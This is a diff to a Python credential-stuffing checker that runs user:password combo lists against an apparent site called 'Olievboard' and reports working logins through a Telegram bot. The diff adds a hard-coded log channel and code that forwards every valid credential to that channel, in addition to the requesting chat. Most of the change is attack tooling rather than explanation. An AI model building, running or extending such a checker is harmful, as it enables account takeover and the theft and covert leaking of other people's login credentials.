@@ -11,9 +11,9 @@ from functools import partial
 # --- CONFIG ---
 MAX_THREADS = 10 
 CUTOFF_DATE = datetime(2026, 4, 1)
+LOG_CHANNEL = -1004441498543
 
 print_lock = threading.Lock()
-progress_lock = threading.Lock()
 
 def is_date_valid(text_block):
     matches = re.findall(
@@ -32,15 +32,11 @@ def is_date_valid(text_block):
 
 def check_account(line, bot, chat_id, hits_list, state, total_lines):
     parts = line.split(':')
-    if len(parts) < 2:
-        with print_lock:
-            state['checked'] += 1
-        return
+    if len(parts) < 2: return
     
     p = parts[-1].strip()
     u = parts[-2].strip()
-    if "/" in u:
-        u = u.split("/")[-1]
+    if "/" in u: u = u.split("/")[-1]
 
     session = requests.Session()
     headers = {
@@ -84,84 +80,76 @@ def check_account(line, bot, chat_id, hits_list, state, total_lines):
                     hit_text += "-" * 50 + "\n"
                     hits_list.append(hit_text)
                     
-                    # Update progress (5 second rule)
-                    update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines, state)
+                    update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
+                    
+                    # Sirf HITS ko logs channel me bhejna
+                    try:
+                        bot.send_message(LOG_CHANNEL, hit_text, parse_mode="Markdown")
+                    except:
+                        pass
                 else:
                     state['checked'] += 1
+                    update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
         else:
             with print_lock:
                 state['checked'] += 1
+                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
 
     except Exception as e:
         with print_lock:
             state['checked'] += 1
+            update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
 
-def update_progress(bot, chat_id, msg_id, hits, checked, total, state):
-    """Update progress only every 5 seconds"""
-    current_time = time.time()
-    
-    # Check if 5 seconds have passed since last update
-    if current_time - state.get('last_update', 0) >= 5:
-        with progress_lock:
-            # Double check inside lock
-            if current_time - state.get('last_update', 0) >= 5:
-                try:
-                    if total > 0:
-                        progress_percent = int((checked / total) * 10)
-                        bar = "■" * progress_percent + "▢" * (10 - progress_percent)
-                    else:
-                        bar = "■■▢▢▢▢▢▢"
-                    
-                    progress_text = f"""╭───☀ 𝖢𝖤𝖢𝖪𝖨𝖭𝖦 ☀───╮
+def update_progress(bot, chat_id, msg_id, hits, checked, total):
+    try:
+        if total > 0:
+            progress_percent = int((checked / total) * 10)
+            bar = "■" * progress_percent + "▢" * (10 - progress_percent)
+        else:
+            bar = "■■▢▢▢▢▢▢"
+        
+        progress_text = f"""╭───☀ 𝖢𝖤𝖢𝖪𝖨𝖭𝖦 ☀───╮
 ┣ ⚙️ {bar} 
 ┣ 📊 Hit : {hits}
 ┣ 📂 Loaded : {checked}/{total}
 ┣ 🔥 Status : Checking...
 ─── 𝐎𝐥𝐢𝐞𝐯𝐁𝐨𝐚𝐫𝐝 𝐁𝐨𝐭 𖤓───╯"""
-                    
-                    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=progress_text)
-                    state['last_update'] = current_time
-                except:
-                    pass
+        
+        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=progress_text)
+    except:
+        pass
 
-def run_check(bot, chat_id, progress_msg_id, combo_file, platform_name="Olievboard"):
+def run_check(bot, chat_id, progress_msg_id, combo_file):
     hits_list = []
     
     with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
         lines = [l.strip() for l in f.readlines() if l.strip()]
 
     total_lines = len(lines)
-    state = {'hits': 0, 'checked': 0, 'msg_id': progress_msg_id, 'last_update': 0}
+    state = {'hits': 0, 'checked': 0, 'msg_id': progress_msg_id}
     
     func = partial(check_account, bot=bot, chat_id=chat_id, hits_list=hits_list, state=state, total_lines=total_lines)
     
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
         executor.map(func, lines)
 
-    # Final .txt file chat me bhejna
+    # Final .txt file chat me bhejna (Clean Name: olievhit.txt)
     final_filename = "olievhit.txt"
     if hits_list and state['hits'] > 0:
         with open(final_filename, "w", encoding="utf-8") as f:
             for hit in hits_list:
                 f.write(hit)
 
-        time.sleep(2)
-        try:
-            with open(final_filename, "rb") as f:
-                bot.send_document(chat_id, f, caption=f"✅ Valid Hits ({state['hits']})")
-        except:
-            pass
+        with open(final_filename, "rb") as f:
+            bot.send_document(chat_id, f, caption=f"✅ Valid Hits ({state['hits']})")
         
         # Local file delete karna
         if os.path.exists(final_filename):
             os.remove(final_filename)
     else:
-        try:
-            bot.send_message(chat_id, "❌ No valid hits found.")
-        except:
-            pass
+        bot.send_message(chat_id, "❌ No valid hits found.")
 
-    # Process Complete hone par Progress/Complete box ko DELETE kar dena
+    # 2. Process Complete hone par Progress/Complete box ko DELETE kar dena
     try:
         bot.delete_message(chat_id, progress_msg_id)
     except:
